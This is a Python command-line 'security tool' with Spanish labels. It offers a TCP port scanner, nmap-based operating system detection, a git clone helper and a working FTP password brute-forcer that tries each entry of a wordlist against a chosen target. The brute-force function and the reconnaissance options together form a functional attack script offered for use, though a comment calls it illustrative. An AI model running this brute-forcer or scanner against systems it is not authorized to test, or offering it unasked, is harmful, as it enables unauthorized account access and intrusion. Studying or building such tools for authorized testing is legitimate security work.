import os
import socket
import subprocess

def escaneo_puertos(target, start_port=1, end_port=1024):
    print(f"[+] Escaneando puertos de {target} desde {start_port} hasta {end_port}")
    abiertos = []
    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"  - Puerto abierto: {port}")
            abiertos.append(port)
        sock.close()
    return abiertos

def escaneo_sistema_operativo(target):
    print(f"[+] Escaneo de sistema operativo para {target}")
    try:
        resultado = subprocess.check_output(['nmap', '-O', target], universal_newlines=True)
        print(resultado)
    except FileNotFoundError:
        print("Nmap no está instalado o no está en el PATH.")
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar nmap: {e}")

def fuerza_bruta_simple(target, usuario, diccionario):
    print(f"[+] Intentando fuerza bruta en FTP para {target} con usuario {usuario}")
    # Este es un ejemplo simple, solo para ilustrar
    import ftplib
    with open(diccionario, 'r') as file:
        for linea in file:
            passwd = linea.strip()
            try:
                ftp = ftplib.FTP(target)
                ftp.login(usuario, passwd)
                print(f"[+] Contraseña encontrada: {passwd}")
                ftp.quit()
                return passwd
            except:
                pass
    print("[-] Contraseña no encontrada.")
    return None

def clonar_repositorio(url):
    print(f"[+] Clonando repositorio: {url}")
    try:
        subprocess.run(['git', 'clone', url], check=True)
        print("[+] Repositorio clonado correctamente.")
    except subprocess.CalledProcessError:
        print("Error al clonar el repositorio. ¿Git está instalado?")

def menu():
    print("""
    Herramienta de Seguridad - Menú
    1. Escaneo de puertos
    2. Escaneo de sistema operativo (requiere nmap)
    3. Fuerza bruta FTP (requiere archivo diccionario)
    4. Clonar repositorio Git
    5. Salir
    """)

if __name__ == "__main__":
    while True:
        menu()
        opcion = input("Elige una opción: ").strip()
        if opcion == '1':
            target = input("Ingresa IP o dominio objetivo: ").strip()
            start_port = int(input("Puerto inicial (default 1): ") or "1")
            end_port = int(input("Puerto final (default 1024): ") or "1024")
            escaneo_puertos(target, start_port, end_port)
        elif opcion == '2':
            target = input("Ingresa IP o dominio objetivo: ").strip()
            escaneo_sistema_operativo(target)
        elif opcion == '3':
            target = input("Ingresa IP objetivo FTP: ").strip()
            usuario = input("Ingresa usuario FTP: ").strip()
            diccionario = input("Ruta al archivo diccionario: ").strip()
            fuerza_bruta_simple(target, usuario, diccionario)
        elif opcion == '4':
            url = input("Ingresa URL del repositorio Git: ").strip()
            clonar_repositorio(url)
        elif opcion == '5':
            print("Saliendo...")
            break
        else:
            print("Opción no válida, intenta de nuevo.")
